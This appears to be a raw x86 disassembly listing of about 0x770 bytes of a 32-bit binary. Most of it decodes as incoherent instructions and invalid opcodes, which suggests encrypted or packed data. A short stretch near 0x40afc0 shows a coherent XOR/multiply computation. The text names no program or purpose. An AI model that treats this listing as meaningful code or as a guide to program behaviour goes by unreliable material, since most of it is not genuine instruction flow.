  40aadb:	fsub   QWORD PTR [bx-0x5e]
  40aadf:	inc    esp
  40aae0:	dec    edi
  40aae1:	jge    0x40ab18
  40aae3:	loope  0x40ab64
  40aae5:	cmp    esp,DWORD PTR [ecx+0x2e26784]
  40aaeb:	mov    dh,dh
  40aaed:	push   cs
  40aaee:	jno    0x40aaa7
  40aaf0:	mov    ch,0x32
  40aaf2:	fld    st(0)
  40aaf4:	cmp    DWORD PTR [ebp+0x7098c1aa],ecx
  40aafa:	add    esi,0xffffff93
  40aafd:	push   ds
  40aafe:	add    DWORD PTR [esi-0x6f],0x4b
  40ab02:	push   ebp
  40ab03:	leave  
  40ab04:	push   0xc6e4f5a7
  40ab09:	xchg   edi,eax
  40ab0a:	aad    0x7b
  40ab0c:	ins    BYTE PTR es:[edi],dx
  40ab0d:	jmp    DWORD PTR [ebp+eiz*1-0xab38301]
  40ab14:	outs   dx,DWORD PTR ds:[esi]
  40ab15:	popa   
  40ab16:	in     al,dx
  40ab17:	repnz (bad) 
  40ab19:	imul   BYTE PTR [ebx]
  40ab1b:	dec    eax
  40ab1c:	(bad)  
  40ab1d:	and    DWORD PTR [edx],edx
  40ab1f:	loope  0x40aba0
  40ab21:	in     eax,dx
  40ab22:	xchg   DWORD PTR [ebp+0x2f],ebx
  40ab25:	xor    BYTE PTR [edi],ch
  40ab27:	cdq    
  40ab28:	pop    ss
  40ab29:	push   edx
  40ab2a:	adc    al,0x2e
  40ab2c:	call   0xf3d3:0x890a80a9
  40ab33:	cmp    bh,cl
  40ab35:	push   edi
  40ab36:	call   0x19839dd1
  40ab3b:	jne    0x40ab1f
  40ab3d:	pop    ebx
  40ab3e:	xchg   ebp,eax
  40ab3f:	or     al,0xe3
  40ab41:	mov    bh,0x33
  40ab43:	aam    0xa2
  40ab45:	into   
  40ab46:	es push esi
  40ab48:	fsubr  st(1),st
  40ab4a:	adc    DWORD PTR [edi+0x57],ebx
  40ab4d:	clc    
  40ab4e:	dec    eax
  40ab4f:	push   eax
  40ab50:	fst    DWORD PTR [edi+edi*2-0x53]
  40ab54:	icebp  
  40ab55:	xor    al,0xb3
  40ab57:	jp     0x40ab53
  40ab59:	std    
  40ab5a:	mov    DWORD PTR ds:0xd5191db4,ebx
  40ab60:	fs call 0xea4e:0xdf1ce9ec
  40ab68:	es dec edi
  40ab6a:	inc    ebx
  40ab6b:	sbb    al,0x1b
  40ab6d:	dec    ebx
  40ab6e:	xchg   ebx,eax
  40ab6f:	xchg   BYTE PTR [ecx+eax*8],bh
  40ab72:	icebp  
  40ab73:	or     al,0x39
  40ab75:	jmp    0x98c5b789
  40ab7a:	mov    esp,0xd4dc6f60
  40ab7f:	(bad)  
  40ab80:	mov    BYTE PTR es:[eax+0x59],ah
  40ab84:	pop    esp
  40ab85:	mov    eax,0x46cd74f0
  40ab8a:	inc    ecx
  40ab8b:	shr    DWORD PTR [eiz*1-0x4659c035],cl
  40ab92:	mov    esi,DWORD PTR [ebp+0x27924dcd]
  40ab98:	mov    bl,0xc6
  40ab9a:	(bad)  
  40ab9c:	shl    BYTE PTR [eax+0x731f0b9c],0x29
  40aba3:	xchg   edx,eax
  40aba4:	loope  0x40ac01
  40aba6:	(bad)  
  40aba7:	xlat   BYTE PTR ds:[ebx]
  40aba8:	ins    DWORD PTR es:[edi],dx
  40aba9:	fisttp DWORD PTR [ecx+0x3e]
  40abac:	sub    eax,0x535d7da3
  40abb1:	add    BYTE PTR [edi*4-0x273a627],bl
  40abb8:	adc    BYTE PTR [edx-0x5445ca7],dl
  40abbe:	cmp    DWORD PTR [eax-0x33],0xffffff8f
  40abc2:	jmp    0xaf4684e8
  40abc7:	add    DWORD PTR [edx-0x13],edi
  40abca:	stos   DWORD PTR es:[edi],eax
  40abcb:	repnz inc esp
  40abcd:	jno    0x40ab9e
  40abcf:	(bad)  
  40abd0:	stos   BYTE PTR es:[edi],al
  40abd1:	jp     0x40abe4
  40abd3:	loop   0x40abd3
  40abd5:	stc    
  40abd6:	repz pop es
  40abd8:	push   ebx
  40abd9:	xchg   ecx,eax
  40abda:	adc    DWORD PTR [ebx+ebx*2+0x75e3ba8],eax
  40abe1:	and    BYTE PTR [ebp+0x20],ch
  40abe4:	or     ebx,DWORD PTR [esi+edi*2-0x437291c7]
  40abeb:	call   0xa817fc37
  40abf0:	aam    0xb2
  40abf2:	push   edi
  40abf3:	aaa    
  40abf4:	lock pop ecx
  40abf6:	push   0xffffff98
  40abf8:	gs mov bh,0x99
  40abfb:	je     0x40abd9
  40abfd:	xchg   edi,eax
  40abfe:	jecxz  0x40ac52
  40ac00:	pop    edx
  40ac01:	add    BYTE PTR [ecx-0x3b],al
  40ac04:	sbb    bl,BYTE PTR [ebp-0x7]
  40ac07:	or     BYTE PTR [edx],0xc5
  40ac0a:	shl    edi,1
  40ac0c:	mov    ebp,0xa7684da6
  40ac11:	mov    dl,0x80
  40ac13:	into   
  40ac14:	daa    
  40ac15:	add    al,BYTE PTR [edx+0x2e170d19]
  40ac1b:	hlt    
  40ac1c:	cmp    edx,DWORD PTR [ebx+0x40]
  40ac1f:	in     al,0x41
  40ac21:	xchg   BYTE PTR [ebp+ecx*1-0x1782e6e5],ch
  40ac28:	cmp    bl,dl
  40ac2a:	cmp    DWORD PTR [ebx],esp
  40ac2c:	jns    0x40ac3c
  40ac2e:	sbb    eax,0x32fdb8c2
  40ac33:	adc    al,BYTE PTR [esi]
  40ac35:	xchg   ebx,eax
  40ac36:	out    0x7,al
  40ac38:	pop    ss
  40ac39:	popa   
  40ac3a:	cmp    dh,BYTE PTR [esi+0x58f353b2]
  40ac40:	sbb    DWORD PTR [edx],ecx
  40ac42:	mov    ds:0xd103f903,al
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0xe76a3c5e
  40ac5f:	xchg   ecx,eax
  40ac60:	ins    DWORD PTR es:[edi],dx
  40ac61:	dec    ebx
  40ac62:	cmp    eax,0xca7c7cfc
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40ac5f
  40ac6b:	push   es
  40ac6c:	popf   
  40ac6d:	pushf  
  40ac6e:	and    al,0xf1
  40ac70:	push   ebx
  40ac71:	mov    es,WORD PTR [esi+0x3c74e67]
  40ac77:	mov    esi,0x140a21fc
  40ac7c:	xor    dh,BYTE PTR [ebx]
  40ac7e:	fxch   st(3)
  40ac80:	(bad)  
  40ac81:	je     0x40ac4f
  40ac83:	cmp    al,0x46
  40ac85:	sub    esp,DWORD PTR [esp+esi*1+0x59]
  40ac89:	mov    esi,DWORD PTR [esp+eax*8]
  40ac8c:	sahf   
  40ac8d:	pop    edi
  40ac8e:	in     eax,dx
  40ac8f:	cmp    esi,ebp
  40ac91:	or     ebp,DWORD PTR ds:0x58a32b36
  40ac97:	or     DWORD PTR [edx-0x6a],edx
  40ac9a:	shl    edi,0x18
  40ac9d:	popa   
  40ac9e:	dec    ebp
  40ac9f:	jle    0x40ac92
  40aca1:	test   DWORD PTR [eax],esi
  40aca3:	inc    ebp
  40aca4:	das    
  40aca5:	push   edx
  40aca6:	xchg   edi,eax
  40aca7:	xor    BYTE PTR [ebx-0x5cd2daf8],dl
  40acad:	dec    esi
  40acae:	lods   eax,DWORD PTR ds:[esi]
  40acaf:	pusha  
  40acb0:	mov    ch,ah
  40acb2:	mov    dh,0xa5
  40acb4:	loop   0x40ac4d
  40acb6:	pop    esp
  40acb7:	enter  0x915d,0x58
  40acbb:	dec    ebp
  40acbc:	fist   DWORD PTR ds:0x2f08aab5
  40acc2:	pop    ecx
  40acc3:	sbb    esp,DWORD PTR [edi+edi*1]
  40acc6:	and    al,0x87
  40acc8:	jle    0x40ad1a
  40acca:	nop
  40accb:	sbb    ah,bl
  40accd:	ja     0x40ad29
  40accf:	mov    WORD PTR [eax+0xca25b9a],gs
  40acd5:	push   ds
  40acd6:	(bad)  
  40acd8:	xchg   DWORD PTR [edi-0x558adb45],edx
  40acde:	and    ah,0xe1
  40ace1:	movhlps xmm1,xmm6
  40ace4:	xchg   DWORD PTR [edx],ebx
  40ace6:	mov    ds:0x16837f4a,eax
  40aceb:	sbb    BYTE PTR ds:0xd85232ce,cl
  40acf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acf2:	dec    ecx
  40acf3:	aad    0x7b
  40acf5:	adc    ebx,ebx
  40acf7:	xor    BYTE PTR [ebp-0x71],cl
  40acfa:	(bad)  
  40acfb:	out    dx,eax
  40acfc:	mov    gs,edi
  40acfe:	popf   
  40acff:	xlat   BYTE PTR ds:[ebx]
  40ad00:	xchg   ebx,eax
  40ad01:	jge    0x40ad74
  40ad03:	test   BYTE PTR [ecx+0x50b4810e],cl
  40ad09:	jge    0x40ad1c
  40ad0b:	and    bh,BYTE PTR [esi]
  40ad0d:	fs aad 0xc0
  40ad10:	cs stos BYTE PTR es:[edi],al
  40ad12:	ret    0x614a
  40ad15:	lock ins DWORD PTR es:[edi],dx
  40ad17:	cmp    edi,DWORD PTR [edi-0x11b522a2]
  40ad1d:	cmp    dl,BYTE PTR [ecx]
  40ad1f:	test   al,0xc2
  40ad21:	sbb    eax,0x1c43a292
  40ad26:	pop    eax
  40ad27:	in     al,dx
  40ad28:	mov    edi,0x59196dd8
  40ad2d:	sahf   
  40ad2e:	stos   BYTE PTR es:[edi],al
  40ad2f:	sti    
  40ad30:	adc    ecx,DWORD PTR [ecx-0x72]
  40ad33:	mov    ds:0x743afd0d,al
  40ad38:	jecxz  0x40ad42
  40ad3a:	add    dh,al
  40ad3c:	sti    
  40ad3d:	sub    ebx,ebx
  40ad3f:	sbb    DWORD PTR [esi],ecx
  40ad41:	(bad)  
  40ad43:	push   ebx
  40ad44:	or     BYTE PTR [edx-0x6f],dl
  40ad47:	call   0x98fb:0x52a956
  40ad4e:	push   eax
  40ad4f:	fwait
  40ad50:	jmp    0x42d7f09b
  40ad55:	xlat   BYTE PTR ds:[ebx]
  40ad56:	jmp    0x10b2:0x1c10f980
  40ad5d:	cli    
  40ad5e:	sub    ch,BYTE PTR [ecx]
  40ad60:	retf   
  40ad61:	lods   al,BYTE PTR ds:[esi]
  40ad62:	bound  ebx,QWORD PTR [ecx]
  40ad64:	add    esp,DWORD PTR [ebx]
  40ad66:	scas   al,BYTE PTR es:[edi]
  40ad67:	jp     0x40ad78
  40ad69:	jmp    0x75c25a28
  40ad6e:	mov    ebx,DWORD PTR [ecx-0x4adf0156]
  40ad74:	not    BYTE PTR [ecx]
  40ad76:	(bad)  
  40ad78:	(bad)  
  40ad7a:	mov    esp,0x1c308a17
  40ad7f:	leave  
  40ad80:	xor    esp,esp
  40ad82:	mov    ds,WORD PTR [esi+edx*1]
  40ad85:	mov    dh,0x4c
  40ad87:	aad    0x0
  40ad89:	rcl    BYTE PTR [ecx+0x8],cl
  40ad8c:	fwait
  40ad8d:	xchg   edi,eax
  40ad8e:	mov    al,ds:0x7096a6af
  40ad93:	and    edi,DWORD PTR [edi]
  40ad95:	enter  0x3826,0xfd
  40ad99:	sub    esp,0x443433ce
  40ad9f:	mov    esi,DWORD PTR [edx-0x759ad699]
  40ada5:	dec    ecx
  40ada6:	inc    ecx
  40ada7:	stos   DWORD PTR es:[edi],eax
  40ada8:	shl    DWORD PTR [ecx-0x22f1a010],0xdb
  40adaf:	mov    ch,0xf3
  40adb1:	xchg   esp,eax
  40adb2:	push   edx
  40adb3:	and    edx,DWORD PTR ds:0x8dbe8849
  40adb9:	pop    edi
  40adba:	test   DWORD PTR [ecx+0x26],esp
  40adbd:	idiv   DWORD PTR [eax]
  40adbf:	cmp    eax,0xe97e4c25
  40adc4:	mov    ebp,DWORD PTR [eax-0x2eaef6a3]
  40adca:	push   es
  40adcb:	aad    0xfa
  40adcd:	(bad)
  40add2:	int3   
  40add3:	repnz dec esp
  40add5:	into   
  40add6:	test   eax,0xf32afef1
  40addb:	fdiv   QWORD PTR [eax]
  40addd:	pop    ebp
  40adde:	fwait
  40addf:	inc    edi
  40ade0:	jae    0x40ad6f
  40ade2:	aas    
  40ade3:	sub    ecx,DWORD PTR es:[edx-0x70]
  40ade7:	test   eax,0xc59bea10
  40adec:	ficomp DWORD PTR [edi-0x20]
  40adef:	repnz scas eax,DWORD PTR es:[edi]
  40adf1:	pop    es
  40adf2:	icebp  
  40adf3:	push   0x1a
  40adf5:	add    DWORD PTR [ebx+0x2125234d],0x1a
  40adfc:	sub    esi,DWORD PTR [edi]
  40adfe:	dec    esp
  40adff:	jmp    0x40adde
  40ae01:	add    DWORD PTR [ecx+edx*1-0x3467317f],0xffffffcd
  40ae09:	inc    ecx
  40ae0a:	inc    edx
  40ae0b:	mov    eax,0x120dc049
  40ae10:	push   esi
  40ae11:	mov    edi,esp
  40ae13:	pop    edx
  40ae14:	das    
  40ae15:	mov    ebx,ebp
  40ae17:	repnz adc eax,0x76ad29ad
  40ae1d:	jns    0x40adb2
  40ae1f:	enter  0xf419,0x83
  40ae23:	into   
  40ae24:	xor    BYTE PTR ds:0xd729349f,bl
  40ae2a:	out    dx,eax
  40ae2b:	jg     0x40aea0
  40ae2d:	cld    
  40ae2e:	push   ecx
  40ae2f:	dec    esi
  40ae30:	sub    eax,0xdadaf223
  40ae35:	cmp    al,0x40
  40ae37:	sub    al,0x87
  40ae39:	std    
  40ae3a:	cmp    ebp,esi
  40ae3c:	(bad)  
  40ae3d:	sub    dl,BYTE PTR [ebx-0x163a2c69]
  40ae43:	std    
  40ae44:	and    eax,0x9fe6ce62
  40ae49:	sbb    BYTE PTR [ebx+0x3cfc5fec],bl
  40ae4f:	outs   dx,BYTE PTR ds:[esi]
  40ae50:	add    BYTE PTR [eax-0x37016d4b],0x9
  40ae57:	(bad)  
  40ae58:	jl     0x40ae6b
  40ae5a:	into   
  40ae5b:	pop    ecx
  40ae5c:	adc    al,0x81
  40ae5e:	fisttp DWORD PTR [eax]
  40ae60:	in     eax,0x44
  40ae62:	push   esi
  40ae63:	cwde   
  40ae64:	adc    BYTE PTR [edx],al
  40ae66:	int3   
  40ae67:	or     eax,0x6872bd20
  40ae6c:	jmp    0x40ae22
  40ae6e:	imul   eax,esi,0x1cbaf320
  40ae74:	in     eax,0x15
  40ae76:	xchg   DWORD PTR ds:0x621d2e0f,eax
  40ae7c:	repz inc edi
  40ae7e:	out    0x73,eax
  40ae80:	dec    eax
  40ae81:	std    
  40ae82:	xchg   BYTE PTR [edx],bl
  40ae84:	push   ecx
  40ae85:	mov    al,ds:0x62d2a0e
  40ae8b:	push   ds
  40ae8c:	imul   eax,DWORD PTR ds:0x5bde96c4,0x68618c45
  40ae96:	into   
  40ae97:	push   esp
  40ae98:	lea    ebp,[ebx+0x50]
  40ae9b:	stos   BYTE PTR es:[edi],al
  40ae9c:	and    edi,edi
  40ae9e:	nop
  40ae9f:	add    eax,0xc82d5118
  40aea4:	pop    ebx
  40aea5:	cdq    
  40aea6:	xor    eax,0x692a9d31
  40aeab:	cld    
  40aeac:	push   es
  40aead:	cmp    edi,DWORD PTR [edi+ebx*2+0x3cbd20a2]
  40aeb4:	jle    0x40ae80
  40aeb6:	pop    edx
  40aeb7:	add    esi,DWORD PTR [ecx-0x7d]
  40aeba:	imul   ebp,DWORD PTR [eax],0x68ee561e
  40aec0:	dec    ecx
  40aec1:	shr    DWORD PTR [ebx+0x2ac740bc],1
  40aec7:	add    al,0x62
  40aec9:	gs or  bl,bl
  40aecc:	outs   dx,BYTE PTR ds:[esi]
  40aecd:	setp   BYTE PTR [esi+0x2a7a9549]
  40aed4:	popa   
  40aed5:	iret   
  40aed6:	test   al,0x1c
  40aed8:	xchg   edi,eax
  40aed9:	test   DWORD PTR [ebx],ebx
  40aedb:	stos   DWORD PTR es:[edi],eax
  40aedc:	scas   al,BYTE PTR es:[edi]
  40aedd:	sbb    dl,0x12
  40aee0:	dec    edi
  40aee1:	popf   
  40aee2:	in     al,0x39
  40aee4:	xor    bl,dl
  40aee6:	nop
  40aee7:	push   ebx
  40aee8:	scas   al,BYTE PTR es:[edi]
  40aee9:	pop    ss
  40aeea:	adc    BYTE PTR [ebx+0x7c],0x42
  40aeee:	aam    0x2a
  40aef0:	jge    0x40ae8b
  40aef2:	xchg   ecx,eax
  40aef3:	mov    cl,0x8d
  40aef5:	xchg   ecx,eax
  40aef6:	and    DWORD PTR [edi-0x8aa8bb5],edi
  40aefc:	(bad)  
  40aefd:	fisttp WORD PTR [esi+0x4a]
  40af00:	add    DWORD PTR [ebx],edi
  40af02:	fisttp WORD PTR [ecx]
  40af04:	mov    al,0xc4
  40af06:	jmp    0x1d9d:0x81f8aca9
  40af0d:	sar    al,0x72
  40af10:	cs jnp 0x40af30
  40af13:	pop    edi
  40af14:	(bad)  
  40af15:	outs   dx,BYTE PTR ds:[esi]
  40af16:	outs   dx,BYTE PTR ds:[esi]
  40af17:	es fucomip st,st(1)
  40af1a:	int    0xe8
  40af1c:	in     eax,0xcd
  40af1e:	lods   al,BYTE PTR ds:[esi]
  40af1f:	jmp    0x40af0b
  40af21:	pop    DWORD PTR [edx+0x182af3bc]
  40af27:	mov    DWORD PTR [ebx*2+0x15125076],edx
  40af2e:	xor    DWORD PTR [edx-0x6a],esp
  40af31:	fld    TBYTE PTR [esi]
  40af33:	xor    DWORD PTR [ebx],edi
  40af35:	push   ebp
  40af36:	test   al,0xf5
  40af38:	ror    BYTE PTR [edi],1
  40af3a:	pop    edi
  40af3b:	xchg   ebx,eax
  40af3c:	arpl   bx,dx
  40af3e:	ins    DWORD PTR es:[edi],dx
  40af3f:	pop    esp
  40af40:	jb     0x40af17
  40af42:	call   0x748a654c
  40af47:	loop   0x40af7a
  40af49:	push   cs
  40af4a:	jns    0x40afc5
  40af4c:	scas   eax,DWORD PTR es:[edi]
  40af4d:	(bad)  
  40af4f:	(bad)  [edx]
  40af51:	or     DWORD PTR [eax-0x55],ebp
  40af54:	inc    edi
  40af55:	or     eax,0xf0099ad9
  40af5a:	pop    edi
  40af5b:	pushf  
  40af5c:	jne    0x40af44
  40af5e:	ds jecxz 0x40afd9
  40af61:	mov    ebp,0xe417d5fd
  40af66:	xor    bh,dh
  40af68:	(bad)  
  40af69:	mov    bl,0xc8
  40af6b:	hlt    
  40af6c:	mov    esp,0x3471af65
  40af71:	mov    eax,ds:0xbcac268d
  40af76:	cli    
  40af77:	add    ebx,ebp
  40af79:	repz fscale 
  40af7c:	lods   eax,DWORD PTR ds:[esi]
  40af7d:	ficom  WORD PTR [esi+0x6795fbf3]
  40af83:	bound  esp,QWORD PTR [edx-0x4de12747]
  40af89:	adc    BYTE PTR fs:[ebx],dh
  40af8c:	rcr    BYTE PTR [ebp-0x2b],cl
  40af8f:	cld    
  40af90:	std    
  40af91:	nop
  40af92:	test   DWORD PTR [edx+0x73df59c4],ebx
  40af98:	adc    eax,0x901498e5
  40af9d:	sbb    DWORD PTR [esi],ecx
  40af9f:	je     0x40afe5
  40afa1:	jns    0x40af45
  40afa3:	mov    dh,0x82
  40afa5:	ss in  al,0xb
  40afa8:	loop   0x40af2e
  40afaa:	popa   
  40afab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afac:	shl    BYTE PTR ds:[esi+0x5e5c2ddd],1
  40afb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afb4:	pushf  
  40afb5:	push   ecx
  40afb6:	mov    ah,0x56
  40afb8:	adc    ebx,edx
  40afba:	pop    edx
  40afbb:	sbb    al,dl
  40afbd:	inc    ebx
  40afbe:	sti    
  40afbf:	daa    
  40afc0:	mov    ebx,DWORD PTR [ebp-0x10]
  40afc3:	sub    ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fadd   st,st(6)
  40b000:	sub    al,0xb2
  40b002:	push   ebx
  40b003:	mov    edi,ecx
  40b005:	jl     0x40b083
  40b007:	retf   0x7c79
  40b00a:	jl     0x40b05b
  40b00c:	push   0xa03042ed
  40b011:	and    dl,BYTE PTR [ecx+0x6bb0617a]
  40b017:	and    ebx,DWORD PTR [ebp+0xe42ef0]
  40b01d:	mov    bh,0x13
  40b01f:	mov    edi,DWORD PTR [edi+ecx*1+0x7f]
  40b023:	in     al,0xf9
  40b025:	cmp    bl,BYTE PTR [eax+0x76]
  40b028:	cli    
  40b029:	mov    dl,ah
  40b02b:	adc    DWORD PTR [edi-0x6485c53e],ebx
  40b031:	dec    esi
  40b032:	xchg   ebx,eax
  40b033:	ins    BYTE PTR es:[edi],dx
  40b034:	jbe    0x40aff4
  40b036:	mov    ebx,0x1084076a
  40b03b:	(bad)  [ebx]
  40b03d:	call   0x427e6224
  40b042:	push   es
  40b043:	cld    
  40b044:	cmp    bl,dl
  40b046:	cld    
  40b047:	sub    eax,0x9b206733
  40b04c:	push   ds
  40b04d:	outs   dx,BYTE PTR ds:[esi]
  40b04e:	push   cs
  40b04f:	pop    ebp
  40b050:	push   ds
  40b051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b052:	popa   
  40b053:	pop    eax
  40b054:	jmp    edi
  40b056:	or     DWORD PTR [ebx],eax
  40b058:	cli    
  40b059:	cld    
  40b05a:	fs push 0x30
  40b05d:	loope  0x40b0a7
  40b05f:	bound  esp,QWORD PTR [edx-0x63fb41f4]
  40b065:	jg     0x40b0ce
  40b067:	or     ebp,DWORD PTR [esi+0xd]
  40b06a:	mov    ch,0x7b
  40b06c:	inc    edi
  40b06d:	enter  0x247c,0xfa
  40b071:	(bad)  
  40b072:	fs cwde 
  40b074:	add    dh,ah
  40b076:	jne    0x40b06a
  40b078:	xchg   edi,eax
  40b079:	sub    ecx,DWORD PTR [ebx+ebp*2]
  40b07c:	call   0xe75d5ab4
  40b081:	sti    
  40b082:	jae    0x40b09e
  40b084:	scas   eax,DWORD PTR es:[edi]
  40b085:	inc    esi
  40b086:	cmp    DWORD PTR [esi-0x54],ebp
  40b089:	xlat   BYTE PTR ds:[ebx]
  40b08a:	xor    esi,esp
  40b08c:	xor    DWORD PTR [ecx-0x2718c4d7],0x15
  40b093:	xchg   esi,esi
  40b095:	aad    0x2e
  40b097:	xchg   edi,eax
  40b098:	mov    ebx,0x30ad2b1d
  40b09d:	fcmove st,st(6)
  40b09f:	jmp    0xb0bd:0xb16a60ba
  40b0a6:	mov    bl,0x3f
  40b0a8:	sti    
  40b0a9:	push   ebp
  40b0aa:	aad    0xac
  40b0ac:	jmp    0xb820:0xb72b11d3
  40b0b3:	inc    eax
  40b0b4:	mov    BYTE PTR [edi],cl
  40b0b6:	and    bl,BYTE PTR [ebp+0x193b0db0]
  40b0bc:	(bad)  
  40b0bd:	and    ch,BYTE PTR [edi+0x5]
  40b0c0:	ret    0xd25c
  40b0c3:	icebp  
  40b0c4:	pop    es
  40b0c5:	std    
  40b0c6:	test   eax,0x8dd7a9c3
  40b0cb:	mov    bh,0xf6
  40b0cd:	(bad)  
  40b0ce:	in     eax,dx
  40b0cf:	jmp    0x3a2:0xc705de7e
  40b0d6:	jg     0x40b05f
  40b0d8:	sbb    ah,BYTE PTR [edx]
  40b0da:	xchg   edx,eax
  40b0db:	mov    eax,0x86796724
  40b0e0:	cwde   
  40b0e1:	(bad)  
  40b0e2:	retf   0x10b4
  40b0e5:	daa    
  40b0e6:	in     al,dx
  40b0e7:	stc    
  40b0e8:	int    0x1d
  40b0ea:	mov    ds:0xd89b5a38,ax
  40b0f0:	daa    
  40b0f1:	stos   DWORD PTR es:[edi],eax
  40b0f2:	sbb    DWORD PTR [ecx],ecx
  40b0f4:	mov    edx,0x7e43b255
  40b0f9:	shl    DWORD PTR [eax],0xf
  40b0fc:	sub    dl,al
  40b0fe:	(bad)  
  40b100:	adc    eax,0x26b14b34
  40b105:	out    0x1d,al
  40b107:	test   DWORD PTR [ebx+0x76],esi
  40b10a:	jb     0x40b17c
  40b10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b10d:	into   
  40b10e:	shl    BYTE PTR [ebx+eax*2-0x50],cl
  40b112:	cld    
  40b113:	rol    BYTE PTR [ecx],1
  40b115:	in     al,dx
  40b116:	mov    esp,0xb9f9f442
  40b11b:	ins    BYTE PTR es:[edi],dx
  40b11c:	push   edx
  40b11d:	jmp    0x40b171
  40b11f:	daa    
  40b120:	cmp    ch,BYTE PTR [edi-0x3ccc00da]
  40b126:	and    DWORD PTR [edi+edx*8+0x2adcaedc],esi
  40b12d:	test   eax,0x8284ac57
  40b132:	inc    ebp
  40b133:	push   cs
  40b134:	sbb    ch,bh
  40b136:	sub    eax,0xb07c751b
  40b13b:	jl     0x40b15f
  40b13d:	adc    ebx,ebp
  40b13f:	ja     0x40b111
  40b141:	mov    cl,0x42
  40b143:	sbb    ebp,DWORD PTR [ebp+0xbd89166]
  40b149:	jns    0x40b1af
  40b14b:	mov    dl,0x41
  40b14d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b14f:	pop    esp
  40b150:	fistp  WORD PTR [ebx+0x7ef615ce]
  40b156:	mov    BYTE PTR [ebp+0xf7a4242],0xa3
  40b15d:	nop
  40b15e:	add    eax,0x1533b31a
  40b163:	cmp    al,0xc3
  40b165:	inc    ebp
  40b166:	popf   
  40b167:	xchg   esp,eax
  40b168:	shl    ah,cl
  40b16a:	cwde   
  40b16b:	call   DWORD PTR [ebp-0x4c]
  40b16e:	popa   
  40b16f:	add    al,0xfd
  40b171:	sub    BYTE PTR [ecx+0x3da5e3fd],ah
  40b177:	mov    ah,0xeb
  40b179:	sahf   
  40b17a:	push   eax
  40b17b:	clc    
  40b17c:	mov    dl,0x44
  40b17e:	shr    DWORD PTR [esi+0x2e],1
  40b181:	sahf   
  40b182:	add    BYTE PTR [eax],dh
  40b184:	mov    gs,ebp
  40b186:	push   eax
  40b187:	mov    ds:0x5534696a,al
  40b18c:	addr16 push edx
  40b18e:	or     ebp,DWORD PTR [ecx+0x4c]
  40b191:	iret   
  40b192:	retf   
  40b193:	loope  0x40b171
  40b195:	adc    eax,0x9cbb3292
  40b19a:	std    
  40b19b:	mov    al,0x21
  40b19d:	pop    eax
  40b19e:	imul   esp,DWORD PTR [edx],0xfffffff0
  40b1a1:	sbb    eax,0x900c7033
  40b1a6:	xor    DWORD PTR [esi+0x5e80d402],0x18475ebe
  40b1b0:	retf   0x9071
  40b1b3:	jp     0x40b187
  40b1b5:	gs out dx,eax
  40b1b7:	dec    edi
  40b1b8:	lea    edx,[eax+ebx*1]
  40b1bb:	or     edx,DWORD PTR [eax]
  40b1bd:	loope  0x40b18a
  40b1bf:	repz xor eax,0x12e9a66d
  40b1c5:	and    DWORD PTR [ecx*1+0x761e6bf8],ebx
  40b1cc:	ret    
  40b1cd:	(bad)  
  40b1ce:	jne    0x40b16c
  40b1d0:	(bad)  
  40b1d1:	cwde   
  40b1d2:	push   ds
  40b1d3:	mov    ds:0xa97daf92,eax
  40b1d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d9:	add    eax,0x24f9af89
  40b1de:	fsub   QWORD PTR [ebx+0x40]
  40b1e1:	dec    esp
  40b1e2:	inc    eax
  40b1e3:	aad    0xc5
  40b1e5:	push   0xffffffad
  40b1e7:	test   ah,0xa8
  40b1ea:	jge    0x40b177
  40b1ec:	dec    edx
  40b1ed:	aas    
  40b1ee:	fldenv [edx+0x534ef3da]
  40b1f4:	(bad)  
  40b1f5:	jp     0x40b18e
  40b1f7:	clc    
  40b1f8:	sti    
  40b1f9:	outs   dx,BYTE PTR ds:[esi]
  40b1fa:	adc    eax,0xca08411e
  40b1ff:	jns    0x40b182
  40b201:	ror    dl,cl
  40b203:	jnp    0x40b1c4
  40b205:	mov    esi,0xf86b7a34
  40b20a:	fild   DWORD PTR [ebx*8-0x285dc2d4]
  40b211:	xlat   BYTE PTR ds:[ebx]
  40b212:	sub    DWORD PTR [edx-0x18],0xffffffcf
  40b216:	daa    
  40b217:	sbb    eax,0xad49c642
  40b21c:	or     ch,BYTE PTR [ecx]
  40b21e:	addr16 mov cl,0x2f
  40b221:	jo     0x40b22e
  40b223:	xlat   BYTE PTR ds:[ebx]
  40b224:	cli    
  40b225:	(bad)  
  40b226:	lods   eax,DWORD PTR ds:[esi]
  40b227:	lods   al,BYTE PTR ds:[esi]
  40b228:	push   ebp
  40b229:	push   ebp
  40b22a:	imul   esp,DWORD PTR [eax+0xd],0xda33ad3c
  40b231:	jp     0x40b1ee
  40b233:	mov    al,0xdf
  40b235:	jns    0x40b242
  40b237:	out    dx,eax
  40b238:	pop    edi
  40b239:	add    al,0x1e
  40b23b:	lods   al,BYTE PTR ds:[esi]
  40b23c:	repz in eax,0x94
  40b23f:	cmp    ecx,ebp
  40b241:	pop    ebp
  40b242:	xlat   BYTE PTR ds:[ebx]
  40b243:	or     eax,0x65a22451
  40b248:	mov    dh,0xf0
  40b24a:	pop    esp
  40b24b:	adc    eax,0x3eb76df6
